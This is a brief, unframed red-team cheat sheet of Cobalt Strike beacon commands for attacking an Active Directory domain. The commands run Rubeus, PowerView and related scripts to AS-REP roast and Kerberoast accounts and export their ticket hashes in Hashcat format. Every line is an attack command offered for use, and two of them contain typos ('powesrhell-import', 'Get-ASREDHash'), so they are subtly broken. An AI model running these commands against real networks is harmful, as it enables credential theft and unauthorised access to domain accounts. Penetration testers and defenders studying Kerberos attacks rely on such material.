````
execute-assembly ~/Desktop/Rubeus.exe asreproast /domain:<domain> /nowrap
execute-assembly ~/Desktop/Rubeus.exe kerberoast /domain:<domain> /nowrap

powesrhell-import /root/tools/PowerSploit/Recon/PowerView.ps1
powerpick Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat
powershell-import /root/tools/kerberoast/autokerberoast_noMimikatz.ps1
powerpick Invoke-AutoKerberoast
powershell-import /root/Desktop/ASREPRoast.ps1
powerpick Get-ASREDHash -Username <tgt user> -verbose
````